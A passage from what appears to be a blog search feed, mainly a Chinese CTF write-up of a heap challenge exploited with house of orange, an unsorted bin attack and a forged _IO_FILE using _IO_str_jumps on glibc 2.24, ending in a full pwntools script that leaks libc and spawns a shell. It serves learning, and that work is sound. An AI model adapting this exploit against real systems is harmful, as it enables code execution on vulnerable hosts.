        <content type="html"><![CDATA[<p>第一次接触house of orange + unsorted bin attack + IO_FILE的堆题，大佬们秒的题我硬是做了两三天才搞出来，结果远程打通了反而本地没打通，本地的问题就先放一放以后再解决了。</p><blockquote><p>题目描述 </p></blockquote><p>保护全开，题目给了四个功能：</p><pre><code>1. Create                      2. Edit                        3. Show                        4. Exit</code></pre><p>其中Create功能中malloc了3个chunk，第二个chunk的大小是可控的，但不超过0x900，第三个chunk的前8个字节是可控的，为两个signed int型的整数，第一个chunk中存了另外两个chunk的地址，以及第一个堆块的地址存在全局变量中（这两个没什么作用）。该功能限制使用4次。</p><pre><code>           (chunk_1)+----+----+                    |    |0x31|          +----+----+(chunk_2)                    +----+----+          |    |size|              +-----|    |    |--------&gt; +----+----+              |     +----+----+          |    |    |              |     |    |    |          +----+----+              |     +----+----+          |    |    |              |                          +----+----+              |                          ...........              |                          +----+----+(chunk_3)              |                          |    |0x21|              |                          +----+----+              +------------------------&gt; |    |    |                                         +----+----+</code></pre><p><br>Edit功能可以修改chunk_2中的数据，由于size可以重新给定，这里存在一个堆溢出可以利用。该功能限制使用1次。<br><br>Show功能用来输出chunk_2中的数据。该功能限制使用2次。<br><br>Exit就是调用exit(0)（用不上）</p><blockquote><p>利用思路 </p></blockquote><ul><li><p>题目没有提供free函数，需要利用house of orange得到一个unsorted bin</p></li><li><p>由于题目提供的输入函数没有在字符串末尾补0，可以利用这一点leak出libc的基址（unsorted bin-&gt;bk)</p></li><li><p>需要使用_IO_FILE结构攻击，低版本下（glibc&lt;=2.23)是通过伪造vtable进行的。但是题目提供的glibc==2.24，添加了新的检查机制（vtable必须要满足在<code>__stop___IO_vtables</code>和<code>__start___libc_IO_vtables</code>之间），这里需要利用<code>_IO_str_jumps</code>结构体进行绕过，因为它不在检查范围之内。这里需要用到malloc_printerr调用链，最终执行的会是<code>_IO_str_overflow</code>。</p><pre><code>malloc_printerr-&gt; __libc_message—&gt;abort-&gt;flush-&gt;_IO_flush_all_lock-&gt;_IO_OVERFLOW</code></pre><p>但最终需要的是调用<code>_IO_str_finish</code>，利用<code>(((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base)</code>完成<code>system(&quot;/bin/sh&quot;)</code>。</p><pre><code class="C">_IO_str_finish (_IO_FILE *fp, int dummy){if (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))  (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);  //[fp+0xe8]fp-&gt;_IO_buf_base = NULL;_IO_default_finish (fp, 0);}</code></pre></li><li><p>通过unsorted bin attack，将<code>_IO_list_all</code>改为<code>main_arena+0x58</code>即main_arena中unsorted bin的位置，此时<code>_IO_list_all-&gt;_chain</code>将指向<code>main_arena+0x58+0x68</code>main_arena中size=0x60的small bin，这个small bin以及其中的内容可以通过Edit中的堆溢出利用得到。当unsorted bin因为unsorted bin attack被破坏时，再次遍历会出错，会调用malloc_printerr。</p></li><li><p>伪造的IO_FILE结构体即<code>_IO_list_all-&gt;_chain</code>指向的结构体需要满足：</p><ol><li><code>fp-&gt;_mode</code> = 0</li><li><code>fp-&gt;_IO_write_ptr</code> &lt; <code>fp-&gt;_IO_write_base</code></li><li><code>fp-&gt;_IO_read_ptr</code> = 0x61 , smallbin4 + 8 (smallbin size)</li><li><code>fp-&gt;_IO_read_base</code> = <code>_IO_list_all</code> -0x10 , smallbin-&gt;bk, unsorted bin attack （以上为绕过<code>_IO_flush_all_lockp</code>的条件）</li><li>vtable = <code>_IO_str_jumps</code> - 8 ，这样调用<code>_IO_overflow</code>时会调用到     <code>_IO_str_finish</code></li><li><code>fp-&gt;_flags</code>= 0</li><li><code>fp-&gt;_IO_buf_base</code> = <code>binsh_addr</code></li><li><code>fp+0xe8</code> = system_addr</li></ol></li></ul><blockquote><p>exp </p></blockquote><pre><code class="python">def create(size, content, _217, _108):    p.sendlineafter(&quot;Your choice:&quot;, &quot;1&quot;)    p.sendlineafter(&quot;Size of Heap: &quot;, str(size))    p.sendafter(&quot;Content: &quot;, content)    p.sendlineafter(&quot;217: &quot;, str(_217))    p.sendlineafter(&quot;108: &quot;, str(_108))def edit(size, content, _217, _108):    p.sendlineafter(&quot;Your choice:&quot;, &quot;2&quot;)    p.sendlineafter(&quot;Size of Heap: &quot;, str(size))    p.sendafter(&quot;Content: &quot;, content)    p.sendlineafter(&quot;217: &quot;, str(_217))    p.sendlineafter(&quot;108: &quot;, str(_108))def show():    p.sendlineafter(&quot;Your choice:&quot;, &quot;3&quot;)    return p.recvuntil(&quot;==========&quot;)def exit():    p.sendlineafter(&quot;Your choice:&quot;, &quot;4&quot;)def pack_file(_flags = 0,              _IO_read_ptr = 0,              _IO_read_end = 0,              _IO_read_base = 0,              _IO_write_base = 0,              _IO_write_ptr = 0,              _IO_write_end = 0,              _IO_buf_base = 0,              _IO_buf_end = 0,              _IO_save_base = 0,              _IO_backup_base = 0,              _IO_save_end = 0,              _IO_marker = 0,              _IO_chain = 0,              _fileno = 0,              _lock = 0,              _wide_data = 0,              _mode = 0):    file_struct = p32(_flags) + \                  p32(0) + \                  p64(_IO_read_ptr) + \                  p64(_IO_read_end) + \                  p64(_IO_read_base) + \                  p64(_IO_write_base) + \                  p64(_IO_write_ptr) + \                  p64(_IO_write_end) + \                  p64(_IO_buf_base) + \                  p64(_IO_buf_end) + \                  p64(_IO_save_base) + \                  p64(_IO_backup_base) + \                  p64(_IO_save_end) + \                  p64(_IO_marker) + \                  p64(_IO_chain) + \                  p32(_fileno)    file_struct = file_struct.ljust(0x88, &quot;\x00&quot;)    file_struct += p64(_lock)    file_struct = file_struct.ljust(0xa0, &quot;\x00&quot;)    file_struct += p64(_wide_data)    file_struct = file_struct.ljust(0xc0, &#39;\x00&#39;)    file_struct += p64(_mode)    file_struct = file_struct.ljust(0xd8, &quot;\x00&quot;)    return file_structdef pack_file_flush_str_jumps(_IO_str_jumps_addr, _IO_list_all_ptr, main_arena_addr, system_addr, binsh_addr):    payload = pack_file(_flags = 0,                        _IO_read_ptr = 0x61, #smallbin5file_size                        _IO_read_end = main_arena_addr,                        _IO_read_base = _IO_list_all_ptr - 0x10, # unsorted bin attack _IO_list_all_ptr,                        _IO_write_base = 0,                        _IO_write_ptr = 1,                        _IO_buf_base = binsh_addr,                        _mode = 0,                        )    payload += p64(_IO_str_jumps_addr - 8)    payload += p64(0) # paddding    payload += p64(system_addr)    return payloadmain_arena_offset = 0x3c1b00_IO_list_all_offset = 0x3c2500_IO_str_jumps_offset = 0x3be4c0system_offset = 0x456a0str_bin_sh_offset = 0x18ac40# old top chunk ==&gt; unsorted bincreate(0x8d8, &quot;A&quot; * 8 + &quot;\n&quot;, 217, 108)edit(0x900, &quot;A&quot; * 0x8d8 + p64(0x21) + &quot;A&quot; * 0x18 + p64(0x6d1), 217, 108)create(0x900, &quot;B&quot; * 8 + &quot;\n&quot;, 217, 108)# leak main_arena and then leak libccreate(8, &quot;B&quot; * 8, 217, 108)res = show()main_arena = u64(res[0x18:0x1e].ljust(8, &#39;\x00&#39;))libc_base = main_arena - 0x58 - main_arena_offset_IO_list_all = libc_base + _IO_list_all_offset_IO_str_jumps = libc_base + _IO_str_jumps_offsetsystem = libc_base + system_offsetstr_bin_sh = libc_base + str_bin_sh_offset# use unsorted bin attack to make _IO_list_all = main_arena + 0x58# thus _IO_list_all-&gt;_chains = main_arena + 0x58 + 0x68 ==&gt; small bin[5] (size = 0x60)# fake a _IO_FILE struct in small bin[4] by writing the unsorted bin# make use of _IO_str_jumps-&gt;_IO_str_finishpayload = &quot;E&quot; * 0x30 payload += pack_file_flush_str_jumps(_IO_str_jumps, _IO_list_all, main_arena, system, str_bin_sh)edit(0x300, payload + &quot;\n&quot; , 217, 108)#create(0x100, &quot;D&quot; * 7 + &quot;\n&quot;, 217, 108)success(&quot;main_arena: &quot; + hex(main_arena))success(&quot;libc_base: &quot; + hex(libc_base))success(&quot;_IO_list_all: &quot; + hex(_IO_list_all))success(&quot;_IO_str_jumps: &quot; + hex(_IO_str_jumps))success(&quot;system: &quot; + hex(system))success(&quot;str_bin_sh: &quot; + hex(str_bin_sh))p.interactive()</code></pre><blockquote><p>小结 </p></blockquote><ol><li>在触发malloc_printerr之后，size=0x60的unsorted bin是怎么进入到small bin的机制还不是很清楚</li><li>除了利用<code>_IO_str_finish</code>之外，还可以利用<code>_IO_str_overflow</code>，不过好像稍微复杂一点，没有尝试</li><li>glibc==2.24的情况下利用IO_FILE结构体攻击的方法不限于此种，还有其他利用方法没有尝试</li></ol><blockquote><p>相关链接 </p></blockquote><p>学习了其他大佬们的文章以及<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/exploit-in-libc2.24-zh/" target="_blank" rel="noopener">CTF wiki</a></p><ol><li><a href="https://xz.aliyun.com/t/5579" target="_blank" rel="noopener">https://xz.aliyun.com/t/5579</a></li><li><a href="https://www.jianshu.com/p/1e45b785efc1" target="_blank" rel="noopener">https://www.jianshu.com/p/1e45b785efc1</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于TEE的一些预备知识</title>
      <link href="/2020/01/24/%E5%85%B3%E4%BA%8ETEE%E7%9A%84%E4%B8%80%E4%BA%9B%E9%A2%84%E5%A4%87%E7%9F%A5%E8%AF%86/"/>
      <url>/2020/01/24/%E5%85%B3%E4%BA%8ETEE%E7%9A%84%E4%B8%80%E4%BA%9B%E9%A2%84%E5%A4%87%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Input password</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="ca004565735f871f081cdea19f2cfcfd9a817f0cc6808e957ae54fa1d8968c7f"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> LearningNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TrustZone </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
